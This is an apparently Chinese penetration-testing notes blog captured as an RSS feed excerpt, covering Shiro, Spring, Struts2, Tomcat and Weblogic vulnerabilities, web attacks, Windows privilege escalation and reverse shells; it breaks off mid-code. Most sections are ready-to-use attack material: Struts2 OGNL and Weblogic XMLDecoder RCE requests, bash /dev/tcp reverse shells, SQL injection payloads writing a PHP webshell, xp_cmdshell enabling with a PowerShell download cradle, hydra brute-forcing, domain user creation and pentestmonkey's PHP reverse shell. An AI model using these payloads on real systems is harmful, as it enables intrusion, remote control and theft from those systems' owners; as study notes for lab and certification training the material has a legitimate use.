&lt;h3 id=&#34;cve-2020-1957认证绕过漏洞&#34;&gt;CVE-2020-1957/认证绕过漏洞&lt;/h3&gt;
&lt;p&gt;Shiro &amp;lt;  1.5.2&lt;/p&gt;
&lt;p&gt;spring Boot中使用Apache Shiro进行身份验证、权限控制时，可以精心构造恶意的URL，利用Apache Shiro和Spring Boot对URL的处理的差异化，可以绕过Apache Shiro对Spring Boot中的Servlet的权限控制，越权并实现未授权访问。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Spring</title>
      <link>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/spring/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/spring/</guid>
      <description>&lt;h1 id=&#34;一spring生态&#34;&gt;一、Spring生态&lt;/h1&gt;
&lt;p&gt;Spring开源框架由Rod Johnson创建，从简单性、可测试性和松耦合的角度而言， 任何Java应用都可以从Spring中受益。 时至今日Spring已不再是一个简单的编程框架了，在整个Spring生态中包含了许多 应用在特定场景的具体框架，如：“Spring Framework”，“Spring Security”，“Spring Boot”，“Spring Cloud”等等，其中“Spring Framework”框架是 整个生态的核心基础，每个框架都有自己独立的代码仓库。&lt;/p&gt;
&lt;p&gt;Spring生态系统提供许多有用的编程框架或工具集。 当下最为流行的Spring项目： Spring Framework，Spring Security，Spring Boot，Spring Cloud等。&lt;/p&gt;
&lt;h2 id=&#34;spring-framework&#34;&gt;Spring Framework&lt;/h2&gt;
&lt;p&gt;Spring Framework项目是整个Spring生态的基础，Spring Framework项目又包含多个子模块，如：spring-core，spring-beans，spring-context，spring-aop，spring web，spring-webmvc等等。&lt;/p&gt;
&lt;h2 id=&#34;spring-boot&#34;&gt;Spring Boot&lt;/h2&gt;
&lt;p&gt;Spring Boot是一个开发基于Spring Framework的项目，它默认集成了嵌入式 Tomcat，配置注解化，支持快速集成第三方开发组件（如MyBatis），大大降低了使用 Spring的门槛，而且内置了许多可以直接用于生产环境的功能，是目前用于开发微服务架构项目的不二选择。&lt;/p&gt;
&lt;h2 id=&#34;spring-cloud&#34;&gt;Spring Cloud&lt;/h2&gt;
&lt;p&gt;Spring Cloud为开发基于微服务架构的软件系统提供了一整套工具集合，其中包含了开发各个微服务组件的具体项目，如：Spring Cloud Config（配置中心），Spring Cloud Netflix（服务注册中心），Spring Cloud Sleuth（服务调用监控），Spring Cloud Gateway（服务网关）等等。 Spring Cloud的基础是Spring Boot，基于Spring Boot可以大大简化开发各微服务组件 的流程。&lt;/p&gt;
&lt;h2 id=&#34;spring-security&#34;&gt;Spring Security&lt;/h2&gt;
&lt;p&gt;Spring Security是用于实现认证和授权，以及访问控制的安全框架，在Java生态与之提 供类似的功能还有一个框架：Apache Shiro。 Spring Security依赖于Spring Framework，也就是说如果要使用Spring Security，那 么应用架构也必须是基于Spring Framework的，这大大限制了Spring Security的使用场景；反之，Shiro就没有这样限制，而且从项目架构上Shiro更加简洁。当然，Spring Security提供了非常丰富的安全控制的功能，在某些方面甚至比Shiro更加完善，与之对 应的是掌握的Spring Security的复杂度比较大。因此，对于在应用中是否选择Spring Security需要根据实际需求来决定。&lt;/p&gt;
&lt;h1 id=&#34;二漏洞原理&#34;&gt;二、漏洞原理&lt;/h1&gt;
&lt;p&gt;Spring于2002年最早提出并随后创建，2009年9月Spring 3.0 RC1发布后，Spring就引入了SpEL (Spring Expression Language)。SpEL(Spring Expression Language)是基于spring的一个表达式语言，类似于struts的OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于Java的反射功能。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Struts2</title>
      <link>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/struts2/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/struts2/</guid>
      <description>&lt;h1 id=&#34;一struts2&#34;&gt;一、Struts2&lt;/h1&gt;
&lt;p&gt;Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架。&lt;/p&gt;
&lt;h1 id=&#34;二漏洞原理&#34;&gt;二、漏洞原理&lt;/h1&gt;
&lt;p&gt;Struts2设计了一套OGNL的模式来操作数据。OGNL（Object Graph Navigation Language）即对象图形导航语言，通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化,是语义字符串与Java对象之间沟通的桥梁。OGNL支持对象方法调用，支持类静态的方法调用和值访问，在java中的格式：&lt;/p&gt;
&lt;p&gt;@[类全名]@[方法名|值名]&lt;/p&gt;
&lt;p&gt;@java.lang.String@format(&amp;lsquo;foo %s&amp;rsquo;, &amp;lsquo;bar&amp;rsquo;)| APP_NAME；&lt;/p&gt;
&lt;p&gt;Struts2的漏洞数量众多，其本质都是一样的(除了S2-052以外)，都是Struts2框架执行了恶意用户传进来的OGNL表达式，可以造成“命令执行、服务器文件操作、打印回显、获取系统属性、危险代码执行”等，只不过需要精心构造不同的OGNL代码而已。&lt;/p&gt;
&lt;p&gt;S2-052漏洞&lt;/p&gt;
&lt;p&gt;这个漏洞也算是轰动一时，其实，跟注入OGNL表达式，达到远程代码执行的方式还不大一样，S2-052漏洞是一种XML反序列化漏洞。漏洞本质是Struts2 REST插件的XStream组件存在反序列化漏洞，当使用XStream组件对XML格式的数据包进行反序列化操作时，没有对数据内容进行有效验证，存在反序列化后远程代码执行安全隐患。&lt;/p&gt;
&lt;p&gt;同时struts2的漏洞时间也很长，S2-001发现时间为2007年，而较近的S2-061时间为2020年，跨度很大。&lt;/p&gt;
&lt;h1 id=&#34;三漏洞特征&#34;&gt;三、漏洞特征&lt;/h1&gt;
&lt;p&gt;.action   .do的请求路径&lt;/p&gt;
&lt;h1 id=&#34;四漏洞利用&#34;&gt;四、漏洞利用&lt;/h1&gt;
&lt;p&gt;S2-057 以下直接梭哈：Struts2_工具v18.09&lt;/p&gt;
&lt;p&gt;S2-061  S2-062&lt;/p&gt;
&lt;p&gt;编写反弹shell代码&lt;/p&gt;
&lt;p&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.52.130/3333 0&amp;gt;&amp;amp;1&lt;/p&gt;
&lt;p&gt;反弹shell涉及到管道符问题要将命令进行base64编码&lt;/p&gt;
&lt;p&gt;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=}|{base64,-d}|{bash,-i}&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /index.action HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 829

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name=&amp;#34;id&amp;#34;

%{(#instancemanager=#application[&amp;#34;org.apache.tomcat.InstanceManager&amp;#34;]).(#stack=#attr[&amp;#34;com.opensymphony.xwork2.util.ValueStack.ValueStack&amp;#34;]).(#bean=#instancemanager.newInstance(&amp;#34;org.apache.commons.collections.BeanMap&amp;#34;)).(#bean.setBean(#stack)).(#context=#bean.get(&amp;#34;context&amp;#34;)).(#bean.setBean(#context)).(#macc=#bean.get(&amp;#34;memberAccess&amp;#34;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&amp;#34;java.util.HashSet&amp;#34;)).(#bean.put(&amp;#34;excludedClasses&amp;#34;,#emptyset)).(#bean.put(&amp;#34;excludedPackageNames&amp;#34;,#emptyset)).(#arglist=#instancemanager.newInstance(&amp;#34;java.util.ArrayList&amp;#34;)).(#arglist.add(&amp;#34;id&amp;#34;)).(#execute=#instancemanager.newInstance(&amp;#34;freemarker.template.utility.Execute&amp;#34;)).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Tomcat</title>
      <link>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/tomcat/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/tomcat/</guid>
      <description>&lt;h1 id=&#34;一tomcat&#34;&gt;一、Tomcat&lt;/h1&gt;
&lt;p&gt;Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。&lt;/p&gt;
&lt;h1 id=&#34;二漏洞介绍与利用&#34;&gt;二、漏洞介绍与利用&lt;/h1&gt;
&lt;h2 id=&#34;1put文件上传-cve-2017-12615&#34;&gt;1、PUT文件上传 CVE-2017-12615&lt;/h2&gt;
&lt;p&gt;主要影响版本：&lt;/p&gt;
&lt;p&gt;Tomcat 7.0.0-7.0.81&lt;/p&gt;
&lt;p&gt;POC：此漏洞较为简单，可梭哈&lt;/p&gt;
&lt;p&gt;Tomcat 7.0.0-7.0.81&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POC：
PUT /1.txt/ HTTP/1.1
Host: 192.168.2.66:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://192.168.2.66:8080/tomcat.css
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 3

cxk
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2ajp文件包含&#34;&gt;2、AJP文件包含&lt;/h2&gt;
&lt;p&gt;由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Weblogic</title>
      <link>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/weblogic/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/weblogic/</guid>
      <description>&lt;h1 id=&#34;一weblogic&#34;&gt;一、Weblogic&lt;/h1&gt;
&lt;p&gt;Weblogic 是美国 Oracle 公司出品的应用服务器软件，确切的说这是基于 Java EE 架构的中间件，主要用于开发、继承、部署和管理大型分布式 web 应用、网络应用和数据库应用。Weblogic 将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的 Java 应用服务器软件之一，也是世界上第一个成功商业化的 Java EE 应用服务器，当然 Weblogic 具有可扩展性、快速开发、灵活可靠等优势，其默认端口为7001，目前比较活跃的版本为10和12，最新版本为14。&lt;/p&gt;
&lt;p&gt;在功能性上，Weblogic 是 Java EE 的全能应用服务器，包括 EJB、JSP、servlet、JMS 等，是商业软件中排名第一的容器（JSP、servlet、EJB等），并提供其他工具（例如Java编辑器），因此也是一个综合的开发以及运行环境。在扩展性上，Weblogic Server 凭借出色的群集技术，拥有处理关键 web 应用系统问题所需的性能、扩展性和高可用性。Weblogic Server 既实现了网页集群，也实现了EJB组件群集，而且不需要任何专门的硬件或操作系统支持。网页群集可以实现透明的复制、负载平衡以及表示内容容错。无论是网页群集还是组建群集，对于电子商务解决方案所要求的可扩展性和可用性都是至关重要的。&lt;/p&gt;
&lt;h1 id=&#34;二漏洞介绍与利用&#34;&gt;二、漏洞介绍与利用&lt;/h1&gt;
&lt;h2 id=&#34;1wls-wsat-xmldecoder-反序列化漏洞cve-2017-10271&#34;&gt;1、wls-wsat XMLDecoder 反序列化漏洞（CVE-2017-10271）&lt;/h2&gt;
&lt;p&gt;Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。&lt;/p&gt;
&lt;p&gt;影响版本&lt;/p&gt;
&lt;p&gt;10.3.6.0.0&lt;/p&gt;
&lt;p&gt;12.1.3.0.0&lt;/p&gt;
&lt;p&gt;12.2.1.1.0&lt;/p&gt;
&lt;p&gt;12.2.1.2.0&lt;/p&gt;
&lt;p&gt;检测方式：&lt;/p&gt;
&lt;p&gt;POC:&lt;/p&gt;
&lt;p&gt;反弹shell记得编码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633

&amp;lt;soapenv:Envelope xmlns:soapenv=&amp;#34;http://schemas.xmlsoap.org/soap/envelope/&amp;#34;&amp;gt; &amp;lt;soapenv:Header&amp;gt;
&amp;lt;work:WorkContext xmlns:work=&amp;#34;http://bea.com/2004/06/soap/workarea/&amp;#34;&amp;gt;
&amp;lt;java version=&amp;#34;1.4.0&amp;#34; class=&amp;#34;java.beans.XMLDecoder&amp;#34;&amp;gt;
&amp;lt;void class=&amp;#34;java.lang.ProcessBuilder&amp;#34;&amp;gt;
&amp;lt;array class=&amp;#34;java.lang.String&amp;#34; length=&amp;#34;3&amp;#34;&amp;gt;
&amp;lt;void index=&amp;#34;0&amp;#34;&amp;gt;
&amp;lt;string&amp;gt;/bin/bash&amp;lt;/string&amp;gt;
&amp;lt;/void&amp;gt;
&amp;lt;void index=&amp;#34;1&amp;#34;&amp;gt;
&amp;lt;string&amp;gt;-c&amp;lt;/string&amp;gt;
&amp;lt;/void&amp;gt;
&amp;lt;void index=&amp;#34;2&amp;#34;&amp;gt;
&amp;lt;string&amp;gt;bash -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/10.0.0.1/21 0&amp;amp;gt;&amp;amp;amp;1&amp;lt;/string&amp;gt;
&amp;lt;/void&amp;gt;
&amp;lt;/array&amp;gt;
&amp;lt;void method=&amp;#34;start&amp;#34;/&amp;gt;&amp;lt;/void&amp;gt;
&amp;lt;/java&amp;gt;
&amp;lt;/work:WorkContext&amp;gt;
&amp;lt;/soapenv:Header&amp;gt;
&amp;lt;soapenv:Body/&amp;gt;
&amp;lt;/soapenv:Envelope&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/zj_img/WEBRESOURCE82c2c4952a93c896bb4a2d5db2359a53%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>web渗透</title>
      <link>https://yangzhuzai.github.io/posts/oscp/web%E6%B8%97%E9%80%8F/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/web%E6%B8%97%E9%80%8F/</guid>
      <description>&lt;p&gt;靶场的关注重点相比实战会更为细节：&lt;/p&gt;
&lt;p&gt;1、域名；
2、网站技术架构cms等；
3、目录；
4、弱口令或者默认口令，弱密码不多，但是需要组合，注意用户名大小写，密码名字复用
5、敏感组合拳信息；
6、web漏洞；&lt;/p&gt;
&lt;h1 id=&#34;fuzz&#34;&gt;FUZZ&lt;/h1&gt;
&lt;p&gt;host域名碰撞&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ffuf -u &amp;#34;http://flight.htb&amp;#34; -H &amp;#34;Host: FUZZ.flight.htb&amp;#34; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50 -fs 229
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;wfuzz&#34;&gt;WFUZZ:&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -u http://sudocuong.com/workinginprogress.php?FUZZ=id --hw=0(看说明)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;子域名爆破&#34;&gt;子域名爆破&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wfuzz -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -u streetfighterclub.htb -H &amp;#34;Host: FUZZ.streetfighterclub.htb&amp;#34; --hw 717   
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;目录扫描&#34;&gt;目录扫描：&lt;/h2&gt;
&lt;p&gt;正常扫描，如果没有东西，又没有其他入口，考虑加大字典、换工具、以及二级目录，各种状态码都有值得一看的必要：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.5.104/ -x php,aspx,jsp,html,js

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.63/ -m HEAD -t 100 --no-error -x php,aspx,jsp,html,js

dirsearch -u  http://192.168.154.129/ 

漏洞字典：
/usr/share/wordlists/dirb/vulns/sharepoint.txt


oscp优化：
dirsearch -u http://192.168.192.141/ --wordlists=/usr/share/wordlists/seclists/Discovery/Web-Content/dirsearch.txt 

这个效果一般
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.192.141/ -x php,txt -x php,js,html -m HEAD -t 50

最后版本：
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.225.153:8000/partner/ -t 1000 --no-error -b 404,503
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;http爆破&#34;&gt;http爆破：&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;表单：
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form &amp;#34;/department/login.php:username=^USER^password=^PASS^:F=Invalid&amp;#34; -t 64

hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form &amp;#34;/index.php:fm_usr=user&amp;amp;fm_pwd=^PASS^:Login failed. Invalid&amp;#34;


摘要认证：
hydra -L 1.txt -P 1.txt 192.168.154.131 http-get /webdav
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;sql注入&#34;&gt;sql注入：&lt;/h1&gt;
&lt;h2 id=&#34;mysql&#34;&gt;mysql&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;连接：
mysql -h10.0.0.1 -uroot -p123
mysql -u school -p&amp;#39;@jCma4s8ZM&amp;lt;?kA&amp;#39; -h localhost

基础语法：
查库名：
union select group_concat(database())#
查表名：
union select group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;library&amp;#39;#
查列名：
union select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;access&amp;#39; #
查数据：
union select group_concat(&amp;#39;\n&amp;#39;,id,&amp;#39;\n&amp;#39;,service,&amp;#39;\n&amp;#39;,username,&amp;#39;\n&amp;#39;,password) from access #
写入：
1&amp;#34;UNION SELECT 1,2,&amp;#34;&amp;lt;?php system($_REQUEST[&amp;#39;a&amp;#39;]);?&amp;gt;&amp;#34; into outfile &amp;#39;C:/inetpub/wwwroot/cxk5.php&amp;#39;#

手动测试流程：
判断是否有注入：
1&amp;#39;-- -
1&amp;#34;-- -
&amp;#39; or 1=1 -- -
判断列数：
-1&amp;#39; order by 1-- -
-1&amp;#39; union select 1,2,3,4,5-- -

mysql爆数据：
group_concat(schema_name) from information_schema.schemata --+  查询库名
group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;webapphacking&amp;#39; --+  查询表名
group_concat(column_name) from information_schema.columns where table_name=&amp;#39;表名&amp;#39; --+ 查询列名
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;mssql&#34;&gt;mssql&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mssql爆数据：
https://www.cnblogs.com/-meditation-/articles/16112699.html
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
值得注意的知识点：
sysobjects：记录了数据库中所有表，常用字段为id、name和xtype。
syscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。

如果你想在当前数据库上下文中查询名为 Hub_DB的数据库中的表名，你可以使用 Hub_DB..sysobjects 的语法来引用 Hub_DB 数据库中的系统表 sysobjects。这样的查询将会返回 Hub_DB 数据库中所有对象的信息，包括表、视图、存储过程等。
Hub_DB..syscolumns同理

表名很多参考id值，爆表名时记得把ID也爆出来

关键词：Warning
Query

普通盲注：
&amp;#39; AND IF (1=1, sleep(3),&amp;#39;false&amp;#39;) --
&amp;#39; OR NOT 1251=1251#
&amp;#39; AND IF (1=1, sleep(3),&amp;#39;false&amp;#39;) -- 

简化xp_cmd:
一条：
EXEC sp_configure &amp;#39;show advanced options&amp;#39;,1;RECONFIGURE;EXEC sp_configure &amp;#39;xp_cmdshell&amp;#39;,1;RECONFIGURE;
二条
EXEC master.dbo.xp_cmdshell &amp;#39;ping 192.168.45.240&amp;#39;;

盲注开启xp_cmd:

curl members.streetfighterclub.htb/old/verify.asp -d 

&amp;#34;username=test&amp;amp;password=test&amp;amp;logintype=64738;EXEC+sp_configure+&amp;#39;show+advanced+options&amp;#39;,1;EXEC+sp_configure+&amp;#39;Xp_cmdshell&amp;#39;,1;RECONFIGURE;+--&amp;#39;;&amp;amp;B1=LogIn&amp;#34;

关闭xp_cmd:
curl members.streetfighterclub.htb/old/verify.asp -d &amp;#34;username=test&amp;amp;password=test&amp;amp;logintype=64738;EXEC+sp_configure+&amp;#39;show+advanced+options&amp;#39;,1;EXEC+sp_configure+&amp;#39;Xp_cmdshell&amp;#39;,0;RECONFIGURE;+--&amp;#39;;&amp;amp;B1=LogIn&amp;#34;

验证：
sudo tcpdump -nni tun0 icmp
username=a&amp;amp;password=a&amp;amp;logintype=1;EXEC+Xp_cmdshell+&amp;#39;ping+10.10.16.5&amp;#39;;&amp;amp;B1=LogIn

反弹shell:
EXEC master.dbo.xp_cmdshell &amp;#34;powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString(&amp;#39;http://192.168.45.175/nishang.ps1&amp;#39;)&amp;#34;;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;xp_cmd命令执行16进制编码，不一定成功&lt;/p&gt;</description>
    </item>
    <item>
      <title>windows 提权</title>
      <link>https://yangzhuzai.github.io/posts/oscp/windows-%E6%8F%90%E6%9D%83/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/windows-%E6%8F%90%E6%9D%83/</guid>
      <description>&lt;p&gt;提权检查项目：注意细心！！！！！！！！！！一切异常情况&lt;/p&gt;
&lt;p&gt;目前实验发现，备份文件、历史记录、内存密码、特殊程序都有可能，然后是密码复用，administrator&lt;/p&gt;
&lt;p&gt;1、计划任务，配合手动可以查看下次运行时间
2、服务，查看是否具备重启服务或者自动运行重启计算机的权限
3、DLL劫持去看软件目录日志吧
4、不可相信命令查看的软件列表，需要手动慢慢看
5、注意WINPEASS的输出，可能存在明文的密码
6、内核提权不多，重点在于特权提权
7、一些特殊的软件或者目录，keepass2\putty\&lt;/p&gt;
&lt;h1 id=&#34;信息收集&#34;&gt;信息收集&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;start /b 程序  后台运行
cmd /k start 后台运行
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看管理员用户组：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;本地
net localgroup administrators

获取所有组
net localgroup
Get-LocalGroup
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;用户添加：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net group site_admin awallace /add /domain

进阶操作：
net user cxk cxk123! /add /domain   添加用户进域
net group 组名 用户名 /add 添加用户到组
net localgroup &amp;#34;Remote Management Users&amp;#34; cxk /add  添加到远程管理组
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看当前用户所属组：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;whoami /groups
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过注册表查看已经安装了的软件：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;64位：
Get-ItemProperty &amp;#34;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&amp;#34; | select displayname

32位：
Get-ItemProperty &amp;#34;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&amp;#34; | select displayname
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过目录查看安装软件情况：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\Program Files (x86)
C:\Program Files
\AppData\Roaming\

C:\Users\cxk\AppData\Roaming
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正在运行的进程：&lt;/p&gt;</description>
    </item>
    <item>
      <title>反弹shell</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E5%8F%8D%E5%BC%B9shell/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%8F%8D%E5%BC%B9shell/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet?trk=article-ssr-frontend-pulse_little-text-block&#34;&gt;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet?trk=article-ssr-frontend-pulse_little-text-block&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;php&#34;&gt;PHP:&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1、webshell代码：
&amp;lt;?php system($_REQUEST[&amp;#39;a&amp;#39;]);?&amp;gt;
使用方式：
?a=id

&amp;lt;?php system($_GET[&amp;#39;a&amp;#39;]);?&amp;gt;
使用方式：
&amp;amp;a=id

&amp;lt;?php echo system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;

如果有拦截，可以尝试以下代码：
&amp;lt;?=`$_GET[0]`?&amp;gt;

2、反弹shell代码：
&amp;lt;?php exec(&amp;#34;/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.254.128/8888 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;); ?&amp;gt;
                bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.45.205/4444 0&amp;gt;&amp;amp;1&amp;#34;

3、php代码

  &amp;lt;?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = &amp;#34;1.0&amp;#34;;
  $ip = &amp;#39;10.10.16.12&amp;#39;;  // You have changed this
  $port = 8888;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = &amp;#39;uname -a; w; id; /bin/sh -i&amp;#39;;
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists(&amp;#39;pcntl_fork&amp;#39;)) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit(&amp;#34;ERROR: Can&amp;#39;t fork&amp;#34;);
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit(&amp;#34;Error: Can&amp;#39;t setsid()&amp;#34;);
      exit(1);
    }

    $daemon = 1;
  } else {
    printit(&amp;#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&amp;#34;);
  }

  // Change to a safe directory
  chdir(&amp;#34;/&amp;#34;);

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit(&amp;#34;$errstr ($errno)&amp;#34;);
